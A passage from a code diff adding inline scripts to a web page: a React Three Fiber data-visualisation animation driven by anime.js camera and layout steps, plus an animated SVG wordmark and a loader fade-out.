+      state.edgesFrom[v3 + 1] = nf[f3 + 1];
+      state.edgesFrom[v3 + 2] = nf[f3 + 2];
+      state.edgesTo[v3] = nf[t3];
+      state.edgesTo[v3 + 1] = nf[t3 + 1];
+      state.edgesTo[v3 + 2] = nf[t3 + 2];
+      i++;
+    }
+    requestAnimationFrame(tickFallback);
+  }
+  React.useEffect(() => () => { if (worker) worker.terminate(); }, []);
+
+  return React.createElement(
+    'div', {
+      className: 'R3FHeader',
+      style: {
+        width: '100%',
+        height: '100vh',
+        display: 'flex',
+        background: '#030519',
+        transition: 'background 1s',
+        position: 'relative',
+      }
+    },
+          [
+            React.createElement(Canvas, {
+        key: 'canvas',
+        dpr: [1, dims.dpr],
+        camera: { fov: FOV, near: CAMERA_NEAR, far: CAMERA_FAR, position: [0, 0, state.camZ] },
+        onCreated: ({ gl, camera }) => {
+          gl.setPixelRatio(dims.dpr);
+          gl.setSize(dims.w, dims.h, false);
+          gl.outputColorSpace = THREE.SRGBColorSpace;
+          gl.toneMapping = THREE.ACESFilmicToneMapping;
+          gl.toneMappingExposure = 1.2;
+          camera.fov = FOV;
+          camera.near = CAMERA_NEAR;
+          camera.far = CAMERA_FAR;
+          camera.position.set(0, 0, state.camZ);
+          camera.updateProjectionMatrix();
+        },
+        style: { position: 'absolute', inset: 0, zIndex: 0, height: window.innerHeight, opacity: 0.9 },
+      }, [
+              React.createElement(CameraSync, { key: 'cam', state }),
+              React.createElement(NodeCloud, { key: 'nodes', state }),
+              React.createElement(Edges, { key: 'edges', state }),
+              React.createElement(Animation, {
+          key: 'anim',
+          settings,
+          setSettings,
+          setEdgeOpacity,
+          setBackground,
+          setStep,
+          setEdgeWidthPx,
+          bumpFrame
+        }),
+            ]),
+            React.createElement(Title, { key: 'title', current: uiStep }),
+          ]
+  );
+}
+
+const RAD2DEG = 180 / Math.PI;
+const DEG2RAD = Math.PI / 180;
+
+function moveCamera(lng, lat, radius = window.innerHeight * 0.5) {
+  const phi = Math.PI / 2 - lat; // polar/elevation
+  const theta = lng + Math.PI; // azimuth (Dataset-Ausrichtung)
+  return [-(radius * Math.sin(phi) * Math.sin(theta)),
+      (radius * Math.cos(phi)),
+      -(radius * Math.sin(phi) * Math.cos(theta))]
+}
+
+function Animation({ settings, setSettings, setEdgeOpacity, setBackground, setStep, setEdgeWidthPx, bumpFrame }) {
+  const { camera } = useThree();
+
+  React.useEffect(() => {
+    function deplaceCAmera(lat, lng, radius) {
+      camera.position.set(...moveCamera(lat, lng, radius));
+      camera.lookAt(0, 0, 0);
+    }
+
+    const originalsettigs = { ...settings };
+    const animations = [];
+    let running = true;
+
+    async function run() {
+      let currentSettings = originalsettigs;
+      const width = window.innerWidth,
+        height = window.innerHeight;
+
+      let offset = 0;
+
+      const calcOffset = s => offset = offset + s
+
+
+      setStep(1)
+      setTimeout(() => {
+        bumpFrame();
+      }, calcOffset(4000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(2)
+      }, calcOffset(4000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(3)
+      }, calcOffset(6000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(4)
+      }, calcOffset(4000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(5)
+      }, calcOffset(4500));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(6)
+      }, calcOffset(5000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(7)
+      }, calcOffset(5000));
+
+      setTimeout(() => {
+        bumpFrame();
+        setStep(8)
+      }, calcOffset(8000));
+
+
+      const __state = {
+        cameraLat: Math.PI,
+        cameraLng: 0,
+        cameraRadius: height * 0.5,
+        edgeOpacity: 0
+      }
+
+      const activeSteps = { 1: true, 2: true, 3: true, 4: true, 5: true, 6: true, 7: true };
+
+      /* ------------------------- STEP 1 ---------------------------------
+         Easing: easeInOutExpo, Dauer 4000ms.
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[1]) {
+        const a = anime({
+          targets: __state,
+          ...{
+            cameraLat: Math.PI * 2,
+            cameraRadius: __state.cameraRadius / ratio()
+          },
+          delay: 0,
+          duration: 4000,
+          easing: 'easeOutExpo',
+          changeBegin: function () {
+            if (!running) return;
+            currentSettings = {
+              layout: Object.keys(layouts)[0],
+              colorScale: 'users',
+              nodes: { display: true, opacity: 1, width: 2 },
+              axises: {
+                axis1: { value: 'startDay', bounds: { values: [0, 360] } },
+                axis2: { value: 'startTime', bounds: { values: [100, 600] } },
+                axis3: { value: 'collaborationNumber', bounds: { values: [-300, 300] } },
+              },
+            };
+            setBackground(BACKG[0]);
+            setEdgeOpacity(0);
+            setSettings(currentSettings);
+
+          },
+          update: function (v) {
+            if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius);
+          },
+        }).finished;
+        animations.push(a);
+        await a;
+      }
+
+      /* ------------------------- STEP 2 ---------------------------------
+         - .add mit Dummy-Target, um "changeBegin" (einmalig) zu bekommen → setSettings.
+         - Danach längerer Kameraschwenk (10s) mit easing 'easeInOutExpo'.
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[2]) {
+        animations.push(anime.timeline({ easing: 'easeInOutExpo' }).add({
+          targets: { i: 0 },
+          ...{ i: 1 },
+          delay: 2000,
+          duration: 100,
+          changeBegin: function () {
+            if (!running) return;
+            currentSettings = {
+              ...currentSettings,
+              axises: {
+                ...currentSettings.axises,
+                axis3: { value: 'users', bounds: { values: [(-window.innerWidth * 0.3) / ratio(), (window.innerWidth * 0.3) / ratio()] } }
+              }
+            };
+            setSettings(currentSettings);
+          },
+        }));
+        animations.push(anime.timeline({
+          easing: 'easeInOutExpo',
+          delay: 500,
+          duration: 12000
+        }).add({
+          easing: 'easeInOutExpo',
+          targets: __state,
+          ...{
+            cameraLat: Math.PI * 2.55,
+            cameraRadius: (height * 0.9) / ratio()
+          },
+          duration: 10000,
+          changeBegin: function () { if (!running) return; setSettings(currentSettings); },
+          update: function (v) { if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius); },
+        }));
+      }
+
+      /* ------------------------- STEP 3 ---------------------------------
+         "Connections emerge": Edges EIN (sichtbar) + BREITER.
+         Zwei Segmente:
+         1) Softes Einblenden der Edge-Opacity (0 → 0.5) über 4s (linear).
+            → Im begin() schalten wir auch die Breite hoch (EDGE_PX_EMPH).
+         2) Achsenwechsel auf 'projects' (axis2), 'users' (axis3), Kanten bleiben an.
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[3]) {
+        const a = anime.timeline({ easing: 'easeInOutExpo' }).add({
+          targets: { opacity: 0 },
+          opacity: 0.95,
+          delay: 6000,
+          easing: 'linear',
+          duration: 4000,
+          update: function (v) { if (running && v.changeBegan) setEdgeOpacity(v.animatables[0].target.opacity); },
+        }).add({
+          targets: { i: 0 },
+          ...{ i: 1 },
+          easing: 'easeInOutExpo',
+          duration: 4000,
+          delay: 6000,
+          changeBegin: function () {
+            if (!running) return;
+            setEdgeWidthPx(EDGE_PX_EMPH*3);
+            currentSettings = {
+              ...currentSettings,
+              edges: {
+                ...currentSettings.edges,
+                display: true
+              },
+              axises: {
+                ...currentSettings.axises,
+                axis2: { value: 'projects', bounds: { values: [100, 700] } },
+                axis3: { value: 'users', bounds: { values: [(-window.innerWidth * 0.3) / ratio(), (window.innerWidth * 0.3) / ratio()] } },
+              },
+            };
+            setSettings(currentSettings);
+          },
+        }, 10).finished;
+        animations.push(a);
+        await a;
+      }
+
+      /* ------------------------- STEP 4 ---------------------------------
+         Farbwechsel (BACKGROUND 1), Skala 'collaborationNumber', weitere Bounds.
+         Kanten wieder AUS (Opacity 0)
+         Dazu kurzer Kameraschritt.
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[4]) {
+        setSettings({...currentSettings,
+          edges: { ...currentSettings.edges, display: false }})
+        const a = anime.timeline({ easing: 'easeInOutExpo' })
+          .add({
+            targets: __state,
+            ...{
+              cameraLat: Math.PI * 2
+            },
+            duration: 2000,
+            update: function (v) { if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius); },
+          })
+          .add({
+            targets: { i: 0 },
+            ...{ i: 1 },
+            duration: 100,
+            changeBegin: function () {
+              if (!running) return;
+              currentSettings = {
+                ...currentSettings,
+                colorScale: 'collaborationNumber',
+                edges: {
+                  ...currentSettings.edges,
+                  display: false
+                },
+                axises: {
+                  ...currentSettings.axises,
+                  axis2: { value: 'projectTasks', bounds: { values: [100, 500] } },
+                  axis3: { value: 'users', bounds: { values: [-1, 1] } },
+                },
+              };
+              setSettings(currentSettings);
+              setBackground(BACKG[1]);
+            },
+          }, 200).add({
+            targets: { i: 0 },
+            ...{ i: 1 },
+            duration: 100,
+            changeBegin: function () {
+              if (!running) return;
+              currentSettings = {
+                ...currentSettings,
+                edges: {
+                  ...currentSettings.edges,
+                  display: false
+                },
+                axises: {
+                  ...currentSettings.axises,
+                  axis2: { value: 'projectTasks', bounds: { values: [100, 500] } },
+                  axis3: {
+                    value: 'collaborationNumber',
+                    bounds: { values: [-1, 500] }
+                  },
+                },
+              };
+              setEdgeWidthPx(EDGE_PX_EMPH * 3);
+              setSettings(currentSettings);
+
+            },
+          }, 1500).add({
+            easing: 'easeInOutExpo',
+            targets: __state,
+            ...{
+              cameraLng: Math.PI * -0.25,
+              cameraRadius: (window.innerHeight * 0.66) / ratio()
+            },
+            duration: 6000,
+            update: function (v) { if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius); },
+          }, 1000).finished;
+        animations.push(a);
+        await a;
+      }
+
+      /* ------------------------- STEP 5 ---------------------------------
+         Übergang ins Grid-Layout, Zoom/FOV-Gefühl, Kanten bleiben AUS.
+         Drei Segmente (kurzer EaseInOut → linearer Drift → Layoutwechsel).
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[5]) {
+        setSettings({...currentSettings,
+            edges: { ...currentSettings.edges, display: false }})
+        const a = anime.timeline({})
+          .add({
+            targets: __state,
+            ...{
+              cameraLng: 0,
+              cameraRadius: (height * 0.71) / (isMobile ? yRatio() : xRatio())
+            },
+            easing: 'easeInOutExpo',
+            duration: 1000,
+            update: function (v) { if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius); },
+          })
+          .add({
+            targets: __state,
+            ...{
+              cameraLat: __state.cameraLat + Math.PI * 0.01,
+              cameraRadius: (height * 0.62) / (isMobile ? yRatio() : xRatio()),
+            },
+            easing: 'linear',
+            duration: 5000,
+            update: function (v) { if (running && v.changeBegan) deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius); },
+          }, 1000)
+          .add({
+            targets: { i: 0 },
+            ...{ i: 1 },
+            duration: 6000,
+            changeBegin: function () {
+              if (!running) return;
+              currentSettings = {
+                ...currentSettings,
+                layout: Object.keys(layouts)[1],
+                colorScale: 'projects',
+                edges: { ...currentSettings.edges, display: false },
+                axises: {
+                  axis1: { value: 'startDay', bounds: { values: [-width * 0.48, width * 0.48] } },
+                  axis2: { value: 'projectTasks', bounds: { values: [-height * 0.45, height * 0.45] } },
+                  axis3: { value: 'collaborationNumber', bounds: { values: [-2, 2] } },
+                },
+              };
+              setSettings(currentSettings);
+              setBackground(BACKG[2]);
+            }
+          }, 0).finished;
+        animations.push(a);
+        await a;
+      }
+
+      animations.push(anime({
+        targets: __state,
+        ...{
+          cameraLat: Math.PI * 2.5,
+          cameraRadius: (height * 1.1) / ratio()
+        },
+        easing: 'linear',
+        duration: 19000,
+        delay: 0,
+        complete: () => {
+          if (running) {
+            //running = false;
+            bumpFrame();
+            animations.forEach(d=>anime.remove(d));
+            run();
+          }
+        },
+        update: function (v) {
+          if (running && v.changeBegan) {
+            setEdgeOpacity(0);
+            deplaceCAmera(__state.cameraLat, __state.cameraLng, __state.cameraRadius);
+          }
+        },
+      }));
+
+      /* ------------------------- STEP 6 ---------------------------------
+         „Logic binds…“: Layout coral, Edges wieder EIN + BREITER (Betonung).
+         Ein Segment zum Ein-/Umschalten.
+      ------------------------------------------------------------------ */
+      if (activeSteps[6]) {
+        const a = anime.timeline({ easing: 'easeInOutExpo' })
+          .add({
+            targets: { opacity: 0 },
+            opacity: 0.5,
+            duration: 3000,
+            update: function (v) { if (running && v.changeBegan) setEdgeOpacity(v.animatables[0].target.opacity); },
+          })
+          .add({
+            targets: { i: 0 },
+            ...{ i: 1 },
+            delay: 0,
+            duration: 6000,
+            changeBegin: function () {
+              if (!running) return;
+              currentSettings = {
+                ...currentSettings,
+                layout: Object.keys(layouts)[3],
+                edges: { ...currentSettings.edges, display: true },
+              };
+              setSettings(currentSettings);
+            },
+          }, 200).finished;
+        animations.push(a);
+        await a;
+      }
+
+      /* ------------------------- STEP 7 ---------------------------------
+         Neuordnung (forceLayout), Edges wieder AUS und zurück auf „dünn“.
+      ------------------------------------------------------------------ */
+      if (running && activeSteps[7]) {
+        const a = anime.timeline({
+            easing: 'easeInOutExpo',
+            duration: 8000,
+            delay: 3000
+          })
+          .add({
+            targets: { i: 0 },
+            ...{ i: 1 },
+            delay: 0,
+            duration: 4000,
+            easing: 'easeInOutExpo',
+            changeBegin: function () {
+              if (!running) return;
+              currentSettings = { ...currentSettings, layout: Object.keys(layouts)[2] };
+              setEdgeOpacity(0);
+              setSettings(currentSettings);
+            },
+          }, 200).finished;
+        animations.push(a);
+        await a;
+      }
+    }
+
+    run();
+
+    return () => {
+      running = false;
+      animations.forEach(d=>anime.remove(d));
+    };
+  }, []);
+
+  return null;
+}
+
+/* ================= Boot ================= */
+if (!webglOK()) { alert('WebGL unavailable. Enable hardware acceleration.'); }
+createRoot(document.getElementById('root')).render(
+  React.createElement(IntlProvider, { locale: 'en', messages: MESSAGES }, React.createElement(App)),
+);
+    </script>
+
+    <script type="module">
+import * as THREE from 'three';
+
+
+window.addEventListener('DOMContentLoaded', () => {
+  removeLoader();
+
+  const svgMarkup = `<svg xmlns="http://www.w3.org/2000/svg" class="vaeora-wordmark" viewBox="0 0 700 100" width="200px" preserveAspectRatio="xMidYMid meet">
+<defs>
+<linearGradient gradientUnits="userSpaceOnUse" x1="50" y1="0" x2="50" y2="100" id="gradient-1" spreadMethod="pad" gradientTransform="matrix(-0.358977, 0.93331, -0.730712, -0.499981, 67.042038, 53.336289)"><stop offset="0" style="stop-color: rgb(255, 255, 255);"/>
+<stop offset="0.1" style="stop-color: rgb(255, 255, 255);"/>
+<stop offset="0.11" style="stop-opacity: 0;"/>
+<stop offset="0.17" style="stop-opacity: 0;"/>
+<stop offset="0.63" style="stop-color: rgb(255, 255, 255);"/>
+<stop offset="1" style="stop-color: rgb(255, 255, 255);"/>
+</linearGradient>
+</defs>
+    <path d="M 50 74 L 80 0 L 100 0 L 60 100 L 40 100 L 50 74 L 50 74 Z M 0 0 L 20 0 L 50 74 L 40 100 L 0 0 Z"
+        style="fill: url(&quot;#gradient-1&quot;);" id="v"/>
+    <path
+        d="M 201.58 100 L 191.4 71.43 L 148.43 71.43 L 138.19 100 L 120 100 L 156.73 0 L 183.28 0 L 220 100 L 201.58 100 Z M 153.72 56.56 L 186 56.56 L 169.88 11.35 L 153.72 56.56 Z"
+        style="will-change: opacity, transform; fill: rgb(255, 255, 255);" id="a">
+<animate attributeName="visibility" values="hidden;visible;hidden" dur="4s" fill="freeze" calcMode="discrete" keyTimes="0; 0.13948; 1"/>
+<animate attributeName="opacity" values="0;0;1;1;0;0" dur="3.83s" fill="freeze" keyTimes="0; 0.158938; 0.25124; 0.77023; 0.84594; 1" calcMode="spline" keySplines="0.7 0 0.84 0; 0.7 0 0.84 0; 0.7 0 0.84 0; 0.7 0 0.84 0; 0.7 0 0.84 0"/>
+<animateTransform type="translate" additive="sum" attributeName="transform" values="-250 0;0 0;0 0;-115 0;-150 0" dur="4s" fill="freeze" keyTimes="0; 0.31715; 0.725; 0.904705; 1" calcMode="spline" keySplines="0.87 0 0.13 1; 0.55 0 1 0.45; 0.09 0 0.34 0.58; 1 0 0.87 1" restart="whenNotActive"/>
+</path>
+    <path
+        d="M 244 56.13 L 244 85.23 L 244 56.13 Z M 244 14.76 L 334 14.68 L 334 0 L 244 0 L 244 56.13 L 324.96 56.21 L 324.96 41.43 L 244 41.44 L 244 14.76 Z M 244 100 L 334 100 L 334 85.19 L 244 85.23 L 244 100 Z"
+        style="will-change: opacity, transform; fill: rgb(255, 255, 255);" id="e">
+<animate attributeName="visibility" values="hidden;visible;hidden" dur="4.14s" fill="freeze" calcMode="discrete" keyTimes="0; 0.1715; 1"/>
+<animate attributeName="opacity" values="0;1;1;0;0" dur="3.36s" fill="freeze" keyTimes="0; 0.13665; 0.67262; 0.79965; 1" calcMode="spline" keySplines="0.7 0 0.84 0; 0.12 0 0.39 0; 0.7 0 0.84 0; 0.7 0 0.84 0" begin="0.69s"/>
+<animateTransform type="translate" additive="sum" attributeName="transform" values="-200 0;0 0;0 0;-250 0;-200 0" dur="4.05s" fill="freeze" keyTimes="0; 0.40628; 0.72099; 0.89383; 1" calcMode="spline" keySplines="0.87 0 0.13 1; 0.55 0 1 0.45; 0.68 0 0.51 1; 0.55 0 1 0.45"/>
+</path>
+    <path
+        d="M 404.98 100 C 394.75 100 385.91 98.11 378.42 94.31 C 370.93 90.5 365.14 84.87 361.1 77.37 C 357 69.88 355 60.76 355 50 C 355 39.23 357 30.12 361.13 22.62 C 365.21 15.14 371 9.5 378.49 5.71 C 385.98 1.89 394.81 0 404.98 0 C 415.18 0 424 1.91 431.57 5.74 C 439 9.55 444.85 15.2 448.92 22.7 C 452.98 30.19 455 39.28 455 50 C 455 60.71 452.95 69.83 448.85 77.3 C 444.75 84.8 438.94 90.44 431.47 94.27 C 423.98 98.11 415.13 100 404.98 100 Z M 404.98 84.85 C 414.75 84.85 422.31 81.99 427.67 76.28 C 433 70.59 435.69 61.94 435.69 50.4 C 435.69 38.51 432.99 29.64 427.6 23.85 C 422.21 18 414.67 15.15 404.98 15.15 C 395.29 15.15 387.74 18 382.35 23.69 C 376.95 29.38 374.27 38 374.27 49.6 C 374.27 61.59 376.93 70.48 382.29 76.22 C 387.63 81.97 395.2 84.85 404.98 84.85 Z"
+        style="will-change: opacity, transform; fill: rgb(255, 255, 255);" id="o">
+      <animate attributeName="visibility" values="hidden;visible;hidden" dur="4.05s" fill="freeze" calcMode="discrete"
+               keyTimes="0; 0.22255; 1"/>
+      <animate attributeName="opacity" values="0;1;1;0;0" dur="3.29s" fill="freeze"
+               keyTimes="0; 0.17824; 0.6535; 0.83427; 1" calcMode="spline"
+               keySplines="0.7 0 0.84 0; 0.7 0 0.84 0; 0.7 0 0.84 0; 0.7 0 0.84 0" begin="0.8s"/>
+      <animateTransform type="translate" additive="sum" attributeName="transform" values="-250 0;0 0;0 0;-350 0;-250 0"
+                        dur="4.21s" fill="freeze" keyTimes="0; 0.46318; 0.69834; 0.85986; 1" calcMode="spline"
+                        keySplines="0.87 0 0.13 1; 0.5 0 0.75 0; 0.58 0.04 0.73 0.89; 0.5 0 0.75 0"/>
+</path>
+    <path
+        d="M 554 100 L 519.82 62.26 L 517.1 62.26 C 512.29 62.26 506.91 62 500.96 61.72 L 500.96 100 L 479 100 L 479 3.67 C 484.6 2.56 490.75 1.67 497.48 1 C 504.2 0.35 510.79 0 517.25 0 C 534.74 0 547.75 2.48 556.32 7.45 C 564.88 12.41 569.15 20.26 569.15 30.95 C 569.15 38.29 566.85 44.38 562.25 49.2 C 557.64 54 550.92 57.51 542 59.67 L 579 100 L 554 100 Z M 500.96 47.65 C 506.85 48.18 512.55 48.45 518 48.45 C 528.53 48.45 536.2 47 541 44.27 C 545.86 41.48 548.29 37 548.29 31 C 548.29 26.88 547.26 23.51 545.22 20.99 C 543.18 18.45 540 16.59 535.76 15.44 C 531.49 14.29 525.92 13.71 519 13.71 C 513 13.71 507 14.19 500.96 15.18 L 500.96 47.65 Z"
+        style="will-change: opacity, transform; fill: rgb(255, 255, 255);" id="r">
+      <animate attributeName="visibility" values="hidden;visible;hidden" dur="4.31s" fill="freeze" calcMode="discrete"
+               keyTimes="0; 0.28721; 1"/>
+      <animate attributeName="opacity" values="0;1;1;0;0" begin="1.03s" dur="3.3s" fill="freeze"
+               keyTimes="0; 0.22343; 0.60417; 0.78274; 1" calcMode="spline"
+               keySplines="0.7 0 0.84 0; 0.7 0 0.84 0; 1 0 1 1; 0.7 0 0.84 0"/>
+      <animateTransform type="translate" additive="sum" attributeName="transform" values="-250 0;0 0;0 0;-470 0;-300 0"
+                        dur="4.33s" fill="freeze" keyTimes="0; 0.51963; 0.6836; 0.83603; 1" calcMode="spline"
+                        keySplines="0.87 0 0.13 1; 0.55 0 1 0.45; 0.41 0 1 0.62; 0.55 0 1 0.45"/>
+</path>
+    <path
+        d="M 681.69 100 L 618.11 100 L 600 100 L 636.74 0 L 663.29 0 L 700 100 L 681.69 100 Z M 618.11 100 L 681.69 100 L 649.88 11.36 L 618.11 100 Z"
+        style="will-change: opacity, transform; fill: rgb(255, 255, 255);" id="a1">
+      <animate attributeName="visibility" values="hidden;visible;hidden" dur="4.23s" fill="freeze" calcMode="discrete"
+               keyTimes="0; 0.32704; 1"/>
+      <animate attributeName="opacity" values="0;1;1;0;0" dur="2.77s" fill="freeze"
+               keyTimes="0; 0.1977; 0.69153; 0.8231; 1" calcMode="spline"
+               keySplines="0.7 0 0.84 0; 0.7 0 0.84 0; 1 0 1 1; 0.7 0 0.84 0" begin="1.34s"/>
+      <animateTransform type="translate" additive="sum" attributeName="transform" values="-250 0;0 0;0 0;-600 0;-600 0"
+                        dur="4.07s" fill="freeze" keyTimes="0; 0.62654; 0.73219; 0.88943; 1" calcMode="spline"
+                        keySplines="0.87 0 0.13 1; 0.55 0 1 0.45; 0.46 0 1 0.33; 1 0 0.87 1"/>
+</path>
+</svg>`
+  const placeholder = document.getElementById('logo-placeholder');
+  const loader = document.getElementById('intro-overlay');
+});
+
+const removeLoader = () => {
+  const intro = document.getElementById('intro-overlay');
+  intro.style.transition = 'opacity 0.5s ease';
+  setTimeout(() => {
+    intro.style.opacity = '0'; // fade-out
+    setTimeout(() => intro.remove(), 500); // detach from DOM
+  }, 500);
+};
+
+    </script>
+  </body>
+
 </html>
